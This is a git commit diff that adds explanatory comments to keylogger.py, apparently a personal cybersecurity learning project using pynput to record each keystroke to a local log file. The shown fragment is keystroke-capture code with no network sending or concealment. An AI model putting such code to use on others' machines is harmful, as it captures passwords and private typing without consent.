e20e078493dab46902b40f33cf27b191281a0f4a
Reeha Thouheed <136245278+ReehaThouheed@users.noreply.github.com>
2025-01-27 21:50:27 +0530

    Update keylogger.py
    Added comments

--- keylogger.py
+++ keylogger.py
@@ -2,8 +2,8 @@ import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir=r"C:\Users\reeha\OneDrive\Desktop\Reeha\Cyber projects\Keylogger"
-logging.basicConfig(filename=(log_dir+"keylogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+log_dir=r"C:\Users\reeha\OneDrive\Desktop\Reeha\Cyber projects\Keylogger" #Path of folder in which you have saved this keylogger python code
+logging.basicConfig(filename=(log_dir+"keylogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s') #In place of "keylogger.txt" you can give any name and with this name your file will be created which contains key stokes
 
 def on_press(key):
 	logging.info(str(key))
